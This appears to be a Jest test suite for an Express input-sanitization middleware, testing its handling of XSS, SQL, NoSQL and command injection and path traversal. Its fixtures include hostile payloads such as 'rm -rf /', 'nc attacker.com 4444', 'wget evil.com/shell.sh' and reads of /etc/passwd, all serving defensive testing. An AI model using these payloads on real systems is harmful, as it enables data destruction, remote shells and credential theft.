/**
 * Input Sanitization Middleware Tests
 * Comprehensive test suite for XSS and injection prevention
 */

const request = require('supertest');
const express = require('express');
const { 
  sanitizeInput, 
  createAdvancedSanitizer,
  sanitizeStringWithThreatDetection,
  sanitizeObjectWithThreatDetection,
  generateCorrelationId
} = require('../middleware/validation');
const featureFlags = require('../middleware/featureFlags');

describe('Input Sanitization Middleware', () => {
  let app;

  beforeEach(() => {
    app = express();
    app.use(express.json());
    
    // Enable feature flags for testing
    featureFlags.enable('INPUT_VALIDATION');
    featureFlags.enable('ENHANCED_SANITIZATION');
    featureFlags.enable('THREAT_DETECTION');
  });

  afterEach(() => {
    // Reset feature flags
    featureFlags.disable('INPUT_VALIDATION');
    featureFlags.disable('ENHANCED_SANITIZATION');
    featureFlags.disable('THREAT_DETECTION');
  });

  describe('Basic Sanitization', () => {
    beforeEach(() => {
      app.use(sanitizeInput());
      app.post('/test', (req, res) => {
        res.json({ 
          body: req.body, 
          query: req.query,
          params: req.params,
          meta: req.sanitizationMeta 
        });
      });
    });

    test('should sanitize XSS script tags', async () => {
      const maliciousInput = {
        name: 'John<script>alert("xss")</script>Doe',
        description: 'Test<script src="evil.js"></script>content'
      };

      const response = await request(app)
        .post('/test')
        .send(maliciousInput)
        .expect(200);

      expect(response.body.body.name).toBe('John&lt;&gt;Doe');
      expect(response.body.body.description).toBe('Test&lt;&gt;content');
      expect(response.body.meta.processed).toBe(true);
    });

    test('should sanitize iframe tags', async () => {
      const maliciousInput = {
        content: 'Safe content<iframe src="http://evil.com"></iframe>more content'
      };

      const response = await request(app)
        .post('/test')
        .send(maliciousInput)
        .expect(200);

      expect(response.body.body.content).toBe('Safe content&lt;&gt;more content');
    });

    test('should sanitize javascript protocols', async () => {
      const maliciousInput = {
        link: 'javascript:alert("xss")',
        url: 'JAVASCRIPT:void(0)'
      };

      const response = await request(app)
        .post('/test')
        .send(maliciousInput)
        .expect(200);

      expect(response.body.body.link).toBe('');
      expect(response.body.body.url).toBe('');
    });

    test('should sanitize event handlers', async () => {
      const maliciousInput = {
        text: 'Click me onclick="alert(\'xss\')" onmouseover="steal()"'
      };

      const response = await request(app)
        .post('/test')
        .send(maliciousInput)
        .expect(200);

      expect(response.body.body.text).toBe('Click me   ');
    });

    test('should sanitize nested objects and arrays', async () => {
      const maliciousInput = {
        user: {
          name: 'John<script>alert("xss")</script>',
          skills: ['JavaScript<script>hack()</script>', 'React']
        },
        comments: [
          { text: 'Good<script>evil()</script>job' },
          { text: 'Nice work' }
        ]
      };

      const response = await request(app)
        .post('/test')
        .send(maliciousInput)
        .expect(200);

      expect(response.body.body.user.name).toBe('John&lt;&gt;');
      expect(response.body.body.user.skills[0]).toBe('JavaScript&lt;&gt;');
      expect(response.body.body.user.skills[1]).toBe('React');
      expect(response.body.body.comments[0].text).toBe('Good&lt;&gt;job');
      expect(response.body.body.comments[1].text).toBe('Nice work');
    });

    test('should handle query parameters', async () => {
      const response = await request(app)
        .post('/test?search=<script>alert("xss")</script>&category=jobs')
        .send({})
        .expect(200);

      expect(response.body.query.search).toBe('&lt;&gt;');
      expect(response.body.query.category).toBe('jobs');
    });

    test('should preserve safe content', async () => {
      const safeInput = {
        name: 'John Doe',
        email: 'john@example.com',
        description: 'A software developer with 5+ years experience',
        skills: ['JavaScript', 'React', 'Node.js']
      };

      const response = await request(app)
        .post('/test')
        .send(safeInput)
        .expect(200);

      expect(response.body.body).toEqual(safeInput);
    });
  });

  describe('Advanced Sanitization', () => {
    test('should detect and log security threats', async () => {
      const consoleSpy = jest.spyOn(console, 'warn').mockImplementation();
      
      app.use(createAdvancedSanitizer({ logThreats: true }));
      app.post('/test', (req, res) => {
        res.json({ 
          body: req.body,
          threats: req.sanitizationMeta.threatTypes
        });
      });

      const maliciousInput = {
        script: '<script>alert("xss")</script>',
        sql: "'; DROP TABLE users; --",
        nosql: '{"$where": "this.password"}'
      };

      const response = await request(app)
        .post('/test')
        .send(maliciousInput)
        .expect(200);

      expect(response.body.threats).toContain('XSS_SCRIPT_TAG');
      expect(response.body.threats).toContain('SQL_INJECTION_CHAR');
      expect(consoleSpy).toHaveBeenCalled();
      
      consoleSpy.mockRestore();
    });

    test('should reject requests in strict mode', async () => {
      app.use(createAdvancedSanitizer({ strictMode: true }));
      app.post('/test', (req, res) => {
        res.json({ body: req.body });
      });

      const maliciousInput = {
        script: '<script>alert("xss")</script>'
      };

      const response = await request(app)
        .post('/test')
        .send(maliciousInput)
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('VALIDATION_ERROR');
    });

    test('should respect whitelist configuration', async () => {
      app.use(createAdvancedSanitizer({ 
        whitelist: ['allowedField'],
        logThreats: false 
      }));
      app.post('/test', (req, res) => {
        res.json({ body: req.body });
      });

      const input = {
        allowedField: '<script>alert("xss")</script>',
        normalField: '<script>alert("xss")</script>'
      };

      const response = await request(app)
        .post('/test')
        .send(input)
        .expect(200);

      // Whitelisted field should not be sanitized
      expect(response.body.body.allowedField).toBe('<script>alert("xss")</script>');
      // Normal field should be sanitized
      expect(response.body.body.normalField).toBe('&lt;&gt;');
    });

    test('should enforce length limits', async () => {
      app.use(createAdvancedSanitizer({ maxLength: 10 }));
      app.post('/test', (req, res) => {
        res.json({ 
          body: req.body,
          threats: req.sanitizationMeta.threatTypes
        });
      });

      const longInput = {
        text: 'This is a very long string that exceeds the limit'
      };

      const response = await request(app)
        .post('/test')
        .send(longInput)
        .expect(200);

      expect(response.body.body.text.length).toBe(10);
      expect(response.body.threats).toContain('LENGTH_LIMIT_EXCEEDED');
    });

    test('should detect custom threat patterns', async () => {
      const customPatterns = [
        { 
          pattern: /\b(admin|root)\b/gi, 
          type: 'PRIVILEGED_KEYWORD', 
          severity: 'MEDIUM' 
        }
      ];

      app.use(createAdvancedSanitizer({ 
        customPatterns,
        logThreats: false 
      }));
      app.post('/test', (req, res) => {
        res.json({ 
          body: req.body,
          threats: req.sanitizationMeta.threatTypes
        });
      });

      const input = {
        username: 'admin',
        role: 'root'
      };

      const response = await request(app)
        .post('/test')
        .send(input)
        .expect(200);

      expect(response.body.threats).toContain('PRIVILEGED_KEYWORD');
    });
  });

  describe('SQL Injection Prevention', () => {
    beforeEach(() => {
      app.use(sanitizeInput());
      app.post('/test', (req, res) => {
        res.json({ body: req.body });
      });
    });

    test('should sanitize SQL injection attempts', async () => {
      const sqlInjectionInputs = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'/*",
        "1; DELETE FROM users WHERE 1=1; --",
        "' UNION SELECT * FROM passwords --"
      ];

      for (const maliciousInput of sqlInjectionInputs) {
        const response = await request(app)
          .post('/test')
          .send({ query: maliciousInput })
          .expect(200);

        // Should remove or neutralize SQL injection characters
        expect(response.body.body.query).not.toContain("'");
        expect(response.body.body.query).not.toContain(';');
        expect(response.body.body.query).not.toContain('--');
      }
    });
  });

  describe('NoSQL Injection Prevention', () => {
    beforeEach(() => {
      app.use(sanitizeInput());
      app.post('/test', (req, res) => {
        res.json({ body: req.body });
      });
    });

    test('should sanitize NoSQL injection attempts', async () => {
      const nosqlInjectionInputs = [
        '{"$where": "this.password"}',
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$exists": true}'
      ];

      for (const maliciousInput of nosqlInjectionInputs) {
        const response = await request(app)
          .post('/test')
          .send({ filter: maliciousInput })
          .expect(200);

        // Should remove NoSQL operators
        expect(response.body.body.filter).not.toMatch(/\$\w+/);
      }
    });
  });

  describe('Command Injection Prevention', () => {
    beforeEach(() => {
      app.use(sanitizeInput());
      app.post('/test', (req, res) => {
        res.json({ body: req.body });
      });
    });

    test('should sanitize command injection attempts', async () => {
      const commandInjectionInputs = [
        'file.txt; rm -rf /',
        'data | nc attacker.com 4444',
        'input && wget evil.com/shell.sh',
        'test `whoami`',
        'file $(cat /etc/passwd)'
      ];

      for (const maliciousInput of commandInjectionInputs) {
        const response = await request(app)
          .post('/test')
          .send({ filename: maliciousInput })
          .expect(200);

        // Should remove command injection characters
        expect(response.body.body.filename).not.toContain(';');
        expect(response.body.body.filename).not.toContain('|');
        expect(response.body.body.filename).not.toContain('&');
        expect(response.body.body.filename).not.toContain('`');
        expect(response.body.body.filename).not.toContain('$(');
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    beforeEach(() => {
      app.use(sanitizeInput());
      app.post('/test', (req, res) => {
        res.json({ body: req.body });
      });
    });

    test('should sanitize path traversal attempts', async () => {
      const pathTraversalInputs = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
      ];

      for (const maliciousInput of pathTraversalInputs) {
        const response = await request(app)
          .post('/test')
          .send({ path: maliciousInput })
          .expect(200);

        // Should remove path traversal sequences
        expect(response.body.body.path).not.toContain('../');
        expect(response.body.body.path).not.toContain('..\\');
      }
    });
  });

  describe('Feature Flag Control', () => {
    test('should skip sanitization when feature flag is disabled', async () => {
      featureFlags.disable('INPUT_VALIDATION');
      
      app.use(sanitizeInput());
      app.post('/test', (req, res) => {
        res.json({ body: req.body });
      });

      const maliciousInput = {
        script: '<script>alert("xss")</script>'
      };

      const response = await request(app)
        .post('/test')
        .send(maliciousInput)
        .expect(200);

      // Should not be sanitized when feature flag is disabled
      expect(response.body.body.script).toBe('<script>alert("xss")</script>');
    });
  });

  describe('Utility Functions', () => {
    test('generateCorrelationId should create unique IDs', () => {
      const id1 = generateCorrelationId();
      const id2 = generateCorrelationId();
      
      expect(id1).toMatch(/^san_[a-z0-9_]+$/);
      expect(id2).toMatch(/^san_[a-z0-9_]+$/);
      expect(id1).not.toBe(id2);
    });

    test('sanitizeStringWithThreatDetection should detect threats', () => {
      const context = {
        timestamp: new Date().toISOString(),
        correlationId: 'test-123'
      };

      const { sanitized, detected } = sanitizeStringWithThreatDetection(
        '<script>alert("xss")</script>',
        context
      );

      expect(sanitized).toBe('&lt;&gt;');
      expect(detected).toHaveLength(1);
      expect(detected[0].type).toBe('XSS_SCRIPT_TAG');
      expect(detected[0].severity).toBe('HIGH');
    });

    test('sanitizeObjectWithThreatDetection should handle complex objects', () => {
      const context = {
        timestamp: new Date().toISOString(),
        correlationId: 'test-123'
      };

      const input = {
        safe: 'normal text',
        dangerous: '<script>alert("xss")</script>',
        nested: {
          array: ['safe', '<iframe src="evil.com"></iframe>']
        }
      };

      const { sanitized, threats } = sanitizeObjectWithThreatDetection(input, context);

      expect(sanitized.safe).toBe('normal text');
      expect(sanitized.dangerous).toBe('&lt;&gt;');
      expect(sanitized.nested.array[0]).toBe('safe');
      expect(sanitized.nested.array[1]).toBe('&lt;&gt;');
      expect(threats).toHaveLength(2);
      expect(threats.map(t => t.type)).toContain('XSS_SCRIPT_TAG');
      expect(threats.map(t => t.type)).toContain('XSS_IFRAME');
    });
  });

  describe('Error Handling', () => {
    test('should handle sanitization errors gracefully', async () => {
      // Mock a sanitization error
      const originalSanitize = require('../middleware/validation').sanitizeStringWithThreatDetection;
      require('../middleware/validation').sanitizeStringWithThreatDetection = () => {
        throw new Error('Sanitization failed');
      };

      app.use(sanitizeInput());
      app.post('/test', (req, res) => {
        res.json({ body: req.body });
      });

      const response = await request(app)
        .post('/test')
        .send({ test: 'data' })
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('VALIDATION_ERROR');

      // Restore original function
      require('../middleware/validation').sanitizeStringWithThreatDetection = originalSanitize;
    });
  });

  describe('Performance', () => {
    test('should handle large objects efficiently', async () => {
      app.use(sanitizeInput());
      app.post('/test', (req, res) => {
        res.json({ 
          processed: true,
          itemCount: Object.keys(req.body).length
        });
      });

      // Create a large object with many fields
      const largeObject = {};
      for (let i = 0; i < 1000; i++) {
        largeObject[`field${i}`] = `value${i}`;
      }

      const startTime = Date.now();
      const response = await request(app)
        .post('/test')
        .send(largeObject)
        .expect(200);
      const endTime = Date.now();

      expect(response.body.processed).toBe(true);
      expect(response.body.itemCount).toBe(1000);
      expect(endTime - startTime).toBeLessThan(1000); // Should complete within 1 second
    });
  });
});